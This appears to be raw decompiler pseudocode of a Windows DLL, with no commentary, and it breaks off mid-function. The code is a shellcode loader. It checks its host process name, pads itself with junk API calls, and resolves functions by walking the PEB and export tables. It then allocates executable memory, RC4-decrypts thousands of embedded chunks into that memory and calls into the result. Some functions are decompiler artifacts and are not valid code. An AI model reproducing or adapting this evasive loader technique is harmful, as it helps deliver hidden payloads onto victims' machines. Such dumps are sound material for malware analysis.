#include "2c986a81-d3a5-4abe-b11d-58aa8d1bc299.h"

char __fastcall sub_180001000(char a1, char a2)
{
  dword_18009D650 -= 3799;
  byte_18009D66C = a1 + byte_18009D66E;
  byte_18009D66D = a1;
  byte_18009D66E = a2;
  dword_18009D654 += 6120;
  return 0;
}


void *sub_180001051()
{
  return &unk_180081000;
}


__int64 __fastcall sub_18000105E(void *a1, DWORD a2)
{
  while ( WaitForSingleObject(a1, a2) )
    ;
  return 1634833831;
}


__int64 sub_180001083()
{
  unsigned int v1; // [rsp+50h] [rbp-164h]
  int v2; // [rsp+58h] [rbp-15Ch]
  int v3; // [rsp+70h] [rbp-144h]
  CHAR v4[4]; // [rsp+94h] [rbp-120h] BYREF
  int v5; // [rsp+98h] [rbp-11Ch]
  char v6; // [rsp+9Ch] [rbp-118h]

  v3 = 37;
  do
  {
    v2 = v3;
    GetModuleFileNameA(0, v4, 0x104u);
    if ( HIBYTE(v5) == 46 && v6 == 69 && (v5 & 0xFF00FF) == 0x460045 )
      goto LABEL_14;
    ++v3;
  }
  while ( v2 + 1 < 482 );
  GetModuleFileNameA(0, v4, 0x104u);
  if ( v6 == 80 && HIWORD(v5) == 16724 && BYTE1(v5) == 83 )
  {
    sub_18000130B();
    return 2;
  }
  v1 = 0;
  if ( !LoadLibraryExW("m", 0, 1u) )
  {
    if ( GetModuleHandleW(L"gwf2XwTq.dll") )
    {
LABEL_14:
      sub_18000130B();
      return 0;
    }
    sub_1800040DC();
    return 1;
  }
  return v1;
}


__int64 sub_18000130B()
{
  void *v0; // rsp
  DWORD v1; // eax
  int v2; // eax
  UINT v3; // eax
  LSTATUS v4; // eax
  BOOL v5; // eax
  BOOL v6; // eax
  BOOL v7; // eax
  int ThreadPriority; // eax
  __int64 result; // rax
  _DWORD v10[22]; // [rsp-50h] [rbp-290h] BYREF
  BOOL (__stdcall *v11)(LCID, DWORD); // [rsp+8h] [rbp-238h]
  int v12; // [rsp+14h] [rbp-22Ch]
  DWORD v13; // [rsp+18h] [rbp-228h]
  int v14; // [rsp+1Ch] [rbp-224h]
  int v15; // [rsp+20h] [rbp-220h]
  int v16; // [rsp+24h] [rbp-21Ch]
  DWORD (__stdcall *v17)(HANDLE, DWORD, BOOL); // [rsp+28h] [rbp-218h]
  __int64 v18; // [rsp+30h] [rbp-210h]
  __int64 v19; // [rsp+38h] [rbp-208h]
  BOOL v20; // [rsp+44h] [rbp-1FCh]
  __int64 v21; // [rsp+48h] [rbp-1F8h]
  BOOL v22; // [rsp+54h] [rbp-1ECh]
  __int64 v23; // [rsp+58h] [rbp-1E8h]
  int v24; // [rsp+60h] [rbp-1E0h]
  BOOL v25; // [rsp+64h] [rbp-1DCh]
  BOOL (__stdcall *v26)(HWND, BOOL); // [rsp+68h] [rbp-1D8h]
  __int64 v27; // [rsp+70h] [rbp-1D0h]
  __int64 v28; // [rsp+78h] [rbp-1C8h]
  __int64 v29; // [rsp+80h] [rbp-1C0h]
  __int64 v30; // [rsp+88h] [rbp-1B8h]
  HDC v31; // [rsp+90h] [rbp-1B0h]
  bool v32; // [rsp+9Fh] [rbp-1A1h]
  unsigned __int64 v33; // [rsp+A0h] [rbp-1A0h]
  LPSTR v34; // [rsp+A8h] [rbp-198h]
  BOOL v35; // [rsp+B4h] [rbp-18Ch]
  const CHAR *v36; // [rsp+B8h] [rbp-188h]
  int v37; // [rsp+C0h] [rbp-180h]
  int v38; // [rsp+C4h] [rbp-17Ch]
  const CHAR *v39; // [rsp+C8h] [rbp-178h]
  int v40; // [rsp+D4h] [rbp-16Ch]
  BOOL (__stdcall *v41)(HANDLE, DWORD); // [rsp+D8h] [rbp-168h]
  __int64 v42; // [rsp+E0h] [rbp-160h]
  HDC CompatibleDC; // [rsp+E8h] [rbp-158h]
  __int64 v44; // [rsp+F0h] [rbp-150h]
  HGDIOBJ StockObject; // [rsp+F8h] [rbp-148h]
  int v46; // [rsp+104h] [rbp-13Ch]
  HGDIOBJ (__stdcall *v47)(int); // [rsp+108h] [rbp-138h]
  unsigned __int64 v48; // [rsp+110h] [rbp-130h]
  unsigned __int64 v49; // [rsp+118h] [rbp-128h]
  unsigned __int64 v50; // [rsp+120h] [rbp-120h]
  unsigned __int64 v51; // [rsp+128h] [rbp-118h]
  unsigned __int64 v52; // [rsp+130h] [rbp-110h]
  BOOL v53; // [rsp+13Ch] [rbp-104h]
  __int64 v54; // [rsp+140h] [rbp-100h]
  __int64 v55; // [rsp+148h] [rbp-F8h]
  BOOL StringTypeA; // [rsp+154h] [rbp-ECh]
  int v57; // [rsp+158h] [rbp-E8h]
  LSTATUS v58; // [rsp+15Ch] [rbp-E4h]
  char *v59; // [rsp+160h] [rbp-E0h]
  int v60; // [rsp+168h] [rbp-D8h]
  int v61; // [rsp+16Ch] [rbp-D4h]
  const CHAR *v62; // [rsp+170h] [rbp-D0h]
  UINT v63; // [rsp+17Ch] [rbp-C4h]
  HKEY *v64; // [rsp+180h] [rbp-C0h]
  int v65; // [rsp+188h] [rbp-B8h]
  int v66; // [rsp+18Ch] [rbp-B4h]
  __int64 v67; // [rsp+190h] [rbp-B0h]
  int v68; // [rsp+198h] [rbp-A8h]
  int v69; // [rsp+19Ch] [rbp-A4h]
  RGBQUAD *v70; // [rsp+1A0h] [rbp-A0h]
  int v71; // [rsp+1ACh] [rbp-94h]
  __int64 v72; // [rsp+1B0h] [rbp-90h]
  DWORD v73; // [rsp+1B8h] [rbp-88h]
  int v74; // [rsp+1BCh] [rbp-84h]
  __int64 v75; // [rsp+1C0h] [rbp-80h]
  __int64 v76; // [rsp+1C8h] [rbp-78h]
  __int64 v77; // [rsp+1D0h] [rbp-70h]
  int v78; // [rsp+1DCh] [rbp-64h]
  __int64 v79; // [rsp+1E0h] [rbp-60h]
  _DWORD *v80; // [rsp+1E8h] [rbp-58h]
  LPPAINTSTRUCT v81; // [rsp+1F0h] [rbp-50h]
  __int64 v82; // [rsp+1F8h] [rbp-48h]
  int v83; // [rsp+204h] [rbp-3Ch] BYREF
  HKEY v84; // [rsp+208h] [rbp-38h] BYREF
  RGBQUAD v85; // [rsp+210h] [rbp-30h] BYREF

  v82 = 0;
  v0 = alloca(80);
  v81 = (LPPAINTSTRUCT)v10;
  v80 = v10;
  v79 = 0;
  do
  {
    v78 = 3742;
    v77 = 11081626;
    v76 = v79;
    v1 = WaitForInputIdle((HANDLE)0xA9179A, 0xE9Eu);
    v75 = 9436268;
    v74 = 3094;
    v73 = v1;
    v2 = SetStretchBltMode((HDC)0x8FFC6C, 3094);
    v72 = 1569552;
    v71 = 1515;
    v70 = &v85;
    v69 = 1065;
    v68 = v2;
    v3 = SetDIBColorTable((HDC)0x17F310, 0x5EBu, 0x429u, &v85);
    v84 = (HKEY)8296066;
    v67 = 2880014;
    v66 = 2351;
    v65 = 1925;
    v64 = &v84;
    v63 = v3;
    v4 = RegOpenUserClassesRoot((HANDLE)0x2BF20E, 0x92Fu, 0x785u, &v84);
    HIWORD(v83) = 35;
    v62 = "aNB2UY9pd";
    v61 = 60;
    v60 = 95;
    v59 = (char *)&v83 + 2;
    v58 = v4;
    v57 = 3610;
    StringTypeA = GetStringTypeA(0x3Cu, 0x5Fu, "aNB2UY9pd", 3610, (LPWORD)&v83 + 1);
    v55 = 11628496;
    v54 = 3855065;
    v53 = PaintRgn((HDC)0xB16FD0, (HRGN)0x3AD2D9);
    v52 = 0;
    do
    {
      v51 = v52;
      v50 = v52 % 0xF;
      v49 = v52 % 0xF - 8;
      if ( v52 % 0xF != 8 )
      {
        v48 = v50 - 6;
        if ( v50 != 6 )
          goto LABEL_7;
        v47 = GetStockObject;
        v46 = 1506;
        StockObject = GetStockObject(1506);
        v44 = 14112516;
        CompatibleDC = CreateCompatibleDC((HDC)0xD75704);
      }
      v42 = 5783887;
      v41 = SetConsoleMode;
      v40 = 979;
      v5 = SetConsoleMode((HANDLE)0x58414F, 0x3D3u);
      v39 = "xhaBf+!2*";
      v38 = 2606;
      v37 = 267;
      v36 = "HB^b2mWp!";
      v35 = v5;
      v34 = CharPrevExA(0xA2Eu, "xhaBf+!2*", "HB^b2mWp!", 0x10Bu);
LABEL_7:
      v33 = v51 + 1;
      v32 = v51 == 860;
      v52 = v51 + 1;
    }
    while ( v51 != 860 );
    v31 = BeginPaint((HWND)0x34AEF3, v81);
    v30 = v76 - 9;
    if ( v76 == 9 )
      goto LABEL_11;
    v29 = v76 - 36;
    if ( v76 == 36 )
    {
      v28 = 4742707;
      v6 = EndPath((HDC)0x485E33);
      v27 = 9904459;
      v26 = EnableWindow;
      v25 = v6;
      v24 = 3226;
      v7 = EnableWindow((HWND)0x97214B, 3226);
      v23 = 743255;
      v22 = v7;
      v21 = 4338463;
      v20 = EndDialog((HWND)0xB5757, 4338463);
LABEL_11:
      v19 = 5791650;
      ThreadPriority = GetThreadPriority((HANDLE)0x585FA2);
      v18 = 3949909;
      v17 = EraseTape;
      v16 = ThreadPriority;
      v15 = 3964;
      v14 = 3487;
      v13 = EraseTape((HANDLE)0x3C4555, 0xD9Fu, 3964);
    }
    v12 = 3961;
    v11 = IsValidLocale;
    v10[21] = 3574;
    v10[20] = IsValidLocale(0xDF6u, 0xF79u);
    result = v76 + 1;
    v79 = v76 + 1;
  }
  while ( v76 != 243 );
  return result;
}


// local variable allocation has failed, the output may be wrong!
BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
}void __fastcall sub_180001A42()
{
  __int64 v0; // rbx
  __int64 v1; // rbp
  __int64 v2; // rdi
  __int64 v3; // r13
  __int64 v4; // r15

  qword_18009D5F8 = v1;
  qword_18009D628 = v3;
  qword_18009D618 = v4;
  qword_18009D640 = v2;
  qword_18009D648 = v0;
  JUMPOUT(0x1800019C9LL);
}


// attributes: thunk
LSTATUS __stdcall RegOpenUserClassesRoot(HANDLE hToken, DWORD dwOptions, REGSAM samDesired, PHKEY phkResult)
{
}// attributes: thunk
DWORD __stdcall WaitForInputIdle(HANDLE hProcess, DWORD dwMilliseconds)
{
}// attributes: thunk
LPSTR __stdcall CharPrevExA(WORD CodePage, LPCSTR lpStart, LPCSTR lpCurrentChar, DWORD dwFlags)
{
}// attributes: thunk
HDC __stdcall BeginPaint(HWND hWnd, LPPAINTSTRUCT lpPaint)
{
}// attributes: thunk
BOOL __stdcall EnableWindow(HWND hWnd, BOOL bEnable)
{
}// attributes: thunk
BOOL __stdcall EndDialog(HWND hDlg, INT_PTR nResult)
{
}// attributes: thunk
DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
{
}// attributes: thunk
DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize)
{
}// attributes: thunk
HMODULE __stdcall LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags)
{
}// attributes: thunk
HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName)
{
}// attributes: thunk
BOOL __stdcall GetStringTypeA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr, int cchSrc, LPWORD lpCharType)
{
}// attributes: thunk
BOOL __stdcall SetConsoleMode(HANDLE hConsoleHandle, DWORD dwMode)
{
}// attributes: thunk
int __stdcall GetThreadPriority(HANDLE hThread)
{
}// attributes: thunk
DWORD __stdcall EraseTape(HANDLE hDevice, DWORD dwEraseType, BOOL bImmediate)
{
}// attributes: thunk
BOOL __stdcall IsValidLocale(LCID Locale, DWORD dwFlags)
{
}// attributes: thunk
int __stdcall SetStretchBltMode(HDC hdc, int mode)
{
}// attributes: thunk
UINT __stdcall SetDIBColorTable(HDC hdc, UINT iStart, UINT cEntries, const RGBQUAD *prgbq)
{
}// attributes: thunk
BOOL __stdcall PaintRgn(HDC hdc, HRGN hrgn)
{
}// attributes: thunk
HGDIOBJ __stdcall GetStockObject(int i)
{
}// attributes: thunk
HDC __stdcall CreateCompatibleDC(HDC hdc)
{
}// attributes: thunk
BOOL __stdcall EndPath(HDC hdc)
{
}unsigned __int64 __fastcall _alloca_probe()
{
  unsigned __int64 result; // rax
  char *v1; // r10
  char *StackLimit; // r11
  char v3; // [rsp+18h] [rbp+8h] BYREF

  v1 = &v3 - result;
  if ( (unsigned __int64)&v3 < result )
    v1 = 0;
  StackLimit = (char *)NtCurrentTeb()->NtTib.StackLimit;
  if ( v1 < StackLimit )
  {
    LOWORD(v1) = (unsigned __int16)v1 & 0xF000;
    do
    {
      StackLimit -= 4096;
      *StackLimit = 0;
    }
    while ( v1 != StackLimit );
  }
  return result;
}


void  sub_18000339E()
{
  BUG();
}


struct _TEB *sub_180003520()
{
  struct _TEB *v0; // rcx

  dword_18009D650 = 0x1FFF;
  v0 = NtCurrentTeb();
  dword_18009D650 = 6393;
  return v0;
}


struct _PEB *sub_180003546()
{
  struct _TEB *v0; // rcx

  dword_18009D650 = 0x1FFF;
  v0 = NtCurrentTeb();
  dword_18009D650 = dword_18009D654 - 4095;
  return v0->ProcessEnvironmentBlock;
}


__int64 __fastcall sub_180003575(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 result; // rax
  int v4; // [rsp+8h] [rbp-48h]
  int v5; // [rsp+Ch] [rbp-44h]
  int v6; // [rsp+14h] [rbp-3Ch]

  dword_18009D65C = 0;
  byte_18009D660 = 0;
  dword_18009D654 = -4384;
  dword_18009D658 = 0;
  v6 = 0;
  do
  {
    *(_BYTE *)(a1 + v6) = v6;
    v6 = ++dword_18009D658;
  }
  while ( dword_18009D658 < 256 );
  dword_18009D658 = 0;
  v5 = 0;
  v4 = dword_18009D650 + 5510;
  do
  {
    dword_18009D664 = 0;
    dword_18009D650 = v4;
    dword_18009D664 = *(unsigned __int8 *)(a2 + v5 % a3) + dword_18009D65C + *(unsigned __int8 *)(a1 + v5);
    result = (unsigned int)(dword_18009D664 / 256);
    dword_18009D65C = dword_18009D664 % 256;
    byte_18009D660 = *(_BYTE *)(a1 + v5);
    dword_18009D650 = v4 - 6769;
    *(_BYTE *)(a1 + v5) = *(_BYTE *)(a1 + dword_18009D664 % 256);
    dword_18009D650 = 2165;
    *(_BYTE *)(a1 + dword_18009D65C) = byte_18009D660;
    dword_18009D654 = dword_18009D650 - 923;
    dword_18009D650 = 8388;
    v5 = ++dword_18009D658;
    v4 = 13898;
  }
  while ( dword_18009D658 < 256 );
  return result;
}


unsigned __int64 __fastcall sub_180003708(unsigned int a1)
{
  unsigned __int64 v1; // rdx

  dword_18009D650 = 0x1FFF;
  v1 = __readgsqword(a1);
  dword_18009D650 = 6393;
  return v1;
}


__int64 __fastcall sub_18000372A(__int64 a1)
{
  __int64 result; // rax

  dword_18009D654 = 2629;
  result = 0;
  if ( *(_DWORD *)(*(int *)(a1 + 60) + a1) == 17744 )
    return *(int *)(a1 + 60) + a1;
  return result;
}


__int16 __fastcall sub_180003762(__int16 a1)
{
  __int16 v2; // [rsp+8h] [rbp-Ch]
  __int16 v3; // [rsp+Ah] [rbp-Ah]
  int v4; // [rsp+Ch] [rbp-8h]
  __int16 v5; // [rsp+12h] [rbp-2h]

  dword_18009D650 = 7815;
  v5 = a1;
  v4 = 8926;
  v3 = a1;
  if ( (unsigned __int16)(a1 - 65) < 0x1Au )
  {
    while ( 1 )
    {
      v2 = v5;
      if ( v5 == 75 )
        break;
      dword_18009D650 = 1729;
      v4 = 2840;
      v5 += 32;
      v3 = v2 + 32;
      if ( (unsigned __int16)(v2 - 33) >= 0x1Au )
        return v3;
    }
    dword_18009D650 = v4;
    return 107;
  }
  return v3;
}


__int64 (__fastcall *sub_180003812())()
{
  __int64 (__fastcall *i)(); // [rsp+18h] [rbp-8h]

  for ( i = sub_180003812;
        *(_WORD *)i != 23117 || *(_DWORD *)((char *)i + *((int *)i + 15)) != 17744;
        i = (__int64 (__fastcall *)())(((unsigned __int64)i - 4096) & 0xFFFFFFFFFFFFF000uLL) )
  {
    ;
  }
  return i;
}


__int64 __fastcall sub_18000387D(__int64 a1)
{
  unsigned __int64 v2; // [rsp+0h] [rbp-20h]
  unsigned __int64 v3; // [rsp+10h] [rbp-10h]

  dword_18009D650 -= 5797;
  v3 = (unsigned __int64)sub_180003812;
  if ( a1 )
  {
    dword_18009D654 = 5429;
    return sub_180003B4B(a1, 0);
  }
  else
  {
    while ( 1 )
    {
      if ( *(_WORD *)v3 == 23117 )
      {
        v2 = v3;
        if ( *(_DWORD *)(v3 + *(int *)(v3 + 60)) == 17744 )
          break;
      }
      v3 = (v3 - 4096) & 0xFFFFFFFFFFFFF000uLL;
    }
  }
  return v2;
}


__int64 __fastcall sub_18000390E(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  __int64 result; // rax
  __int64 i; // [rsp+Ch] [rbp-58h]
  int v6; // [rsp+14h] [rbp-50h]
  int v7; // [rsp+18h] [rbp-4Ch]
  int v8; // [rsp+1Ch] [rbp-48h]

  dword_18009D658 = 0;
  dword_18009D65C = 0;
  dword_18009D668 = 0;
  result = (unsigned int)(dword_18009D650 - 3070);
  dword_18009D654 = dword_18009D650 - 3070;
  if ( a4 )
  {
    v8 = dword_18009D650 - 3070;
    v7 = 0;
    v6 = 0;
    for ( i = 0; ; ++i )
    {
      dword_18009D658 = (v7 + 1) % 256;
      dword_18009D650 = v8 - 3550;
      result = (unsigned int)((v6 + *(unsigned __int8 *)(a1 + dword_18009D658)) / 256);
      dword_18009D65C = (v6 + *(unsigned __int8 *)(a1 + dword_18009D658)) % 256;
      dword_18009D650 = v8 - 8298;
      byte_18009D660 = *(_BYTE *)(a1 + dword_18009D658);
      *(_BYTE *)(a1 + dword_18009D658) = *(_BYTE *)(a1 + dword_18009D65C);
      *(_BYTE *)(a1 + dword_18009D65C) = byte_18009D660;
      dword_18009D668 = (unsigned __int8)(*(_BYTE *)(a1 + dword_18009D658) + *(_BYTE *)(a1 + dword_18009D65C));
      dword_18009D654 = dword_18009D650 - 667;
      *(_BYTE *)(a2 + i) = *(_BYTE *)(a1 + (unsigned int)dword_18009D668) ^ *(_BYTE *)(a3 + i);
      dword_18009D650 = 4529;
      if ( (_DWORD)i == a4 - 1 )
        break;
      v7 = dword_18009D658;
      v8 = dword_18009D654;
      v6 = dword_18009D65C;
    }
  }
  return result;
}


__int64 __fastcall sub_180003AC2(__int64 a1, __int64 a2, int a3)
{
  _BYTE v7[256]; // [rsp+20h] [rbp-100h] BYREF

  sub_180003575((__int64)v7, (__int64)&unk_1800050F9, 0x20u);
  dword_18009D650 -= 2510;
  return sub_18000390E((__int64)v7, a1, a2, a3);
}


struct _LIST_ENTRY *__fastcall sub_180003B4B(__int64 a1, struct _LIST_ENTRY *a2)
{
  struct _PEB *ProcessEnvironmentBlock; // rax
  struct _LIST_ENTRY *p_InMemoryOrderModuleList; // r8
  struct _LIST_ENTRY *Flink; // rax
  bool v5; // r9
  __int16 v6; // ax
  unsigned __int16 Blink; // dx
  struct _LIST_ENTRY *v8; // r8
  struct _LIST_ENTRY *v9; // rcx
  int v11; // [rsp+0h] [rbp-88h]
  bool v12; // [rsp+7h] [rbp-81h]
  struct _LIST_ENTRY *v13; // [rsp+8h] [rbp-80h]
  struct _LIST_ENTRY *v15; // [rsp+30h] [rbp-58h]
  bool v16; // [rsp+3Fh] [rbp-49h]
  unsigned int v17; // [rsp+40h] [rbp-48h]
  unsigned int v18; // [rsp+48h] [rbp-40h]
  unsigned int v19; // [rsp+4Ch] [rbp-3Ch]
  struct _LIST_ENTRY *v20; // [rsp+68h] [rbp-20h]

  dword_18009D650 = 0x1FFF;
  ProcessEnvironmentBlock = NtCurrentTeb()->ProcessEnvironmentBlock;
  dword_18009D654 = 7278;
  p_InMemoryOrderModuleList = &ProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList;
  Flink = p_InMemoryOrderModuleList->Flink;
  dword_18009D650 = 1298;
  v20 = p_InMemoryOrderModuleList;
  if ( Flink == p_InMemoryOrderModuleList )
  {
LABEL_15:
    dword_18009D650 = 1021;
    return 0;
  }
  else
  {
    v16 = a2 != 0;
    v15 = Flink;
    while ( 1 )
    {
      dword_18009D650 = 6176;
      if ( v15[2].Flink == a2 && v16 )
      {
        v6 = sub_180003762(84);
        dword_18009D654 = dword_18009D650 + 9801;
        if ( v6 != 49 )
          return v15 - 1;
        dword_18009D650 = 2250;
      }
      Blink = (unsigned __int16)v15[4].Blink;
      dword_18009D654 = 425;
      v8 = v15[5].Flink;
      dword_18009D650 = 8585;
      Blink >>= 1;
      v18 = Blink;
      v13 = v8;
      v17 = 0;
      if ( Blink )
      {
        while ( 1 )
        {
          dword_18009D650 = 6406;
          v19 = v17;
          if ( !*((_WORD *)&v13->Flink + v17) )
            break;
          v5 = *(_WORD *)(a1 + 2LL * v17) == (unsigned __int16)sub_180003762(*((_WORD *)&v13->Flink + v17));
          dword_18009D650 = 7626;
          ++v17;
          if ( v19 + 1 >= v18 || !v5 )
          {
            v11 = v5;
            goto LABEL_12;
          }
        }
        v12 = *(_WORD *)(a1 + 2LL * v17) == 0;
        dword_18009D650 = 4616;
        v11 = v12;
LABEL_12:
        if ( v11 )
          return v15[2].Flink;
      }
      v9 = v15->Flink;
      dword_18009D654 = 4492;
      v15 = v9;
      if ( v9 == v20 )
        goto LABEL_15;
    }
  }
}


__int64 __fastcall sub_180003DB7(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // r9
  __int64 v3; // r9
  __int64 v4; // r11
  __int64 v5; // r8
  bool v6; // r11
  unsigned int v7; // eax
  _BYTE *v9; // [rsp+6h] [rbp-90h]
  unsigned int v10; // [rsp+12h] [rbp-84h]
  unsigned int v11; // [rsp+16h] [rbp-80h]
  __int64 v12; // [rsp+1Eh] [rbp-78h]
  unsigned int v13; // [rsp+36h] [rbp-60h]
  unsigned int v14; // [rsp+3Ah] [rbp-5Ch]
  unsigned __int16 *v15; // [rsp+3Eh] [rbp-58h]
  int v16; // [rsp+4Ah] [rbp-4Ch]
  __int64 v17; // [rsp+56h] [rbp-40h]
  __int64 v18; // [rsp+66h] [rbp-30h]
  unsigned int v19; // [rsp+72h] [rbp-24h]
  __int64 v20; // [rsp+76h] [rbp-20h]

  v1 = sub_180004645();
  v2 = 0;
  if ( *(_DWORD *)(*(int *)(v1 + 60) + v1) == 17744 )
    v2 = *(int *)(v1 + 60) + v1;
  dword_18009D654 = 4349;
  v3 = *(unsigned int *)(v2 + 136);
  v4 = *(unsigned int *)(v1 + v3 + 32) + v1;
  dword_18009D650 = 1120;
  v20 = v4;
  v19 = *(_DWORD *)(v1 + v3 + 24);
  v18 = v1;
  v17 = 0;
  if ( v19 )
  {
    v16 = 1120;
    v15 = (unsigned __int16 *)(*(unsigned int *)(v1 + v3 + 36) + v1);
    v14 = 0;
    while ( 1 )
    {
      dword_18009D650 = v16 - 6684;
      dword_18009D654 = v16 - 5092;
      v13 = v14;
      v12 = *(unsigned int *)(v20 + 4LL * v14);
      v11 = 0;
      do
      {
        dword_18009D654 = 5381;
        v5 = v12 + v11;
        v6 = *(_BYTE *)(v1 + v5) == *(_BYTE *)(a1 + v11);
        dword_18009D654 = -3453;
        v10 = v11;
        v9 = (_BYTE *)(v11 + a1);
        if ( !*(_BYTE *)(v1 + v5) )
          break;
        ++v11;
      }
      while ( v10 + 1 < 0x20 && *v9 != 0 && v6 );
      if ( v6 )
        break;
      dword_18009D654 = 9386;
      ++v14;
      v16 -= 6684;
      ++v15;
      v17 = 0;
      if ( v13 + 1 >= v19 )
        return v17;
    }
    dword_18009D654 = v16 - 7729;
    v7 = *(_DWORD *)(*(unsigned int *)(v1 + v3 + 28) + v1 + 4LL * *v15);
    dword_18009D650 = 5419;
    return v7 + v18;
  }
  return v17;
}


__int64 __fastcall sub_18000401C(__int64 a1, __int64 a2, __int64 a3)
{
  int v4; // [rsp+0h] [rbp-24h]
  __int64 v5; // [rsp+4h] [rbp-20h]

  dword_18009D654 = 1370;
  dword_18009D650 = 2941;
  v5 = 0;
  v4 = 1635;
  if ( a3 )
  {
    do
    {
      dword_18009D650 = 5512;
      *(_BYTE *)(a1 + v5) = *(_BYTE *)(a2 + v5);
      ++v5;
    }
    while ( v5 != a3 );
    v4 = dword_18009D650 - 1306;
  }
  dword_18009D654 = v4;
  return a1;
}


__int64 __fastcall sub_1800040B0(__int64 a1)
{
  __int64 v1; // rax

  dword_18009D650 = 8381;
  v1 = sub_180004184();
  return sub_180004737(v1, a1);
}


__int64 sub_1800040DC()
{
  _QWORD v1[4]; // [rsp+4h] [rbp-60h] BYREF

  dword_18009D650 = 4525;
  sub_180004254(v1);
  return ((__int64 (__fastcall *)(__int64, __int64, __int64, __int64))v1[0])(
           qword_18009D5E8,
           qword_18009D5F0,
           qword_18009D608,
           qword_18009D610);
}


struct _LIST_ENTRY *sub_180004184()
{
  __m128i v0; // xmm0
  __int64 j; // [rsp+0h] [rbp-78h]
  __int64 i; // [rsp+8h] [rbp-70h]
  _OWORD v4[6]; // [rsp+18h] [rbp-60h] BYREF

  dword_18009D650 = 8033;
  for ( i = 0; i != 14; ++i )
    *((_BYTE *)&v4[4] + i) = byte_1800050D3[i] - byte_18000511A[i];
  dword_18009D650 = 9122;
  dword_18009D654 = 3446;
  for ( j = 0; j != 4; ++j )
  {
    v0 = _mm_loadl_epi64((const __m128i *)((char *)&v4[4] + j * 8));
    v4[j] = _mm_srai_epi16(_mm_unpacklo_epi8(v0, v0), 8u);
  }
  dword_18009D650 = -4995;
  dword_18009D654 = 5429;
  return sub_180003B4B((__int64)v4, 0);
}


__int64 __fastcall sub_180004254(_QWORD *a1)
{
  bool v1; // zf
  struct _LIST_ENTRY *v2; // rax
  __int64 (__fastcall *v3)(_QWORD, _QWORD, __int64, __int64); // rax
  __int64 v4; // rax
  int v5; // r10d
  __int64 v6; // r8
  unsigned int v7; // r11d
  int v9; // [rsp+10h] [rbp-178h]
  __int64 v10; // [rsp+20h] [rbp-168h]
  unsigned int v11; // [rsp+2Ch] [rbp-15Ch]
  __int64 v12; // [rsp+30h] [rbp-158h]
  __int64 v13; // [rsp+38h] [rbp-150h]
  __int64 i; // [rsp+48h] [rbp-140h]
  unsigned int v15; // [rsp+50h] [rbp-138h]
  unsigned int v16; // [rsp+54h] [rbp-134h]
  __int64 v17; // [rsp+58h] [rbp-130h]
  _BYTE v19[32]; // [rsp+68h] [rbp-120h] BYREF
  _BYTE v20[256]; // [rsp+88h] [rbp-100h] BYREF

  dword_18009D654 = 5219;
  dword_18009D650 = 4735;
  v17 = 0;
  v16 = 0;
  do
  {
    v1 = v17 == 2074;
    v15 = v16 + (*((_DWORD *)&unk_180081000 + 14 * v17) ^ *((_DWORD *)&unk_180081000 + 14 * v17 + 11));
    ++v17;
    v16 = v15;
  }
  while ( !v1 );
  dword_18009D654 = -3208;
  dword_18009D650 = 5335;
  for ( i = 0; i != 14; ++i )
    v19[i] = byte_18000512B[i] - byte_18000511A[i];
  dword_18009D654 = 3446;
  dword_18009D650 = 8381;
  v2 = sub_180004184();
  v3 = (__int64 (__fastcall *)(_QWORD, _QWORD, __int64, __int64))sub_180004737(v2, v19);
  v4 = v3(0, v15, 4096, 64);
  dword_18009D654 = 6193;
  v13 = v4;
  v12 = 0;
  v11 = 0;
  do
  {
    v5 = *((_DWORD *)&unk_180081000 + 14 * v12 + 11);
    v6 = *((_QWORD *)&unk_180081000 + 7 * v12 + 6);
    v7 = *((_DWORD *)&unk_180081000 + 14 * v12);
    dword_18009D650 = 3572;
    dword_18009D654 = 4688;
    v10 = v12;
    v9 = v5 ^ v7;
    sub_18000401C(v11 + v13, v6, v5 ^ v7);
    dword_18009D654 = dword_18009D650 + 1957;
    ++v12;
    v11 += v9;
  }
  while ( v10 != 2074 );
  dword_18009D654 = 7411;
  sub_180003575((__int64)v20, (__int64)&unk_1800050F9, 0x20u);
  dword_18009D650 -= 2510;
  sub_18000390E((__int64)v20, v13, v13, v15);
  *a1 = v13 + 337039;
  dword_18009D650 = 8698;
  a1[1] = 3678520;
  return 0;
}


__int64 __fastcall sub_180004569(__int64 a1)
{
  char v1; // r9
  unsigned int v3; // [rsp+0h] [rbp-10h]
  unsigned int v4; // [rsp+4h] [rbp-Ch]

  dword_18009D650 = 9301;
  v4 = 0;
  do
  {
    v1 = *(_BYTE *)(a1 + v4);
    v3 = v4++;
  }
  while ( v1 );
  return v3;
}


__int64 __fastcall sub_1800045B0(__int64 a1, __int64 a2, int a3)
{
  int v3; // edx
  char v4; // r9
  __int64 result; // rax
  __int64 v6; // [rsp+0h] [rbp-28h]

  if ( a3 )
  {
    v6 = 0;
    do
    {
      dword_18009D650 = 9122;
      v3 = v6;
      v4 = byte_18000511A[v6 & 0xF];
      dword_18009D654 = 9820;
      *(_BYTE *)(a1 + v6) = *(_BYTE *)(a2 + v6) - v4;
      result = ++v6;
    }
    while ( v3 != a3 - 1 );
  }
  dword_18009D654 = 3446;
  return result;
}


struct _LIST_ENTRY *sub_180004645()
{
  __m128i v0; // xmm0
  __int64 j; // [rsp+8h] [rbp-80h]
  __int64 i; // [rsp+10h] [rbp-78h]
  _OWORD v4[6]; // [rsp+28h] [rbp-60h] BYREF

  dword_18009D654 = dword_18009D650 - 3004;
  dword_18009D650 = 2787;
  for ( i = 0; i != 11; ++i )
    *((_BYTE *)&v4[4] + i) = byte_1800050C8[i] - byte_18000511A[i];
  dword_18009D654 = 3446;
  dword_18009D650 = 7012;
  for ( j = 0; j != 4; ++j )
  {
    v0 = _mm_loadl_epi64((const __m128i *)((char *)&v4[4] + j * 8));
    v4[j] = _mm_srai_epi16(_mm_unpacklo_epi8(v0, v0), 8u);
  }
  dword_18009D650 = 1215;
  dword_18009D654 = 5429;
  return sub_180003B4B((__int64)v4, 0);
}


__int64 __fastcall sub_180004737(__int64 a1, __int64 a2)
{
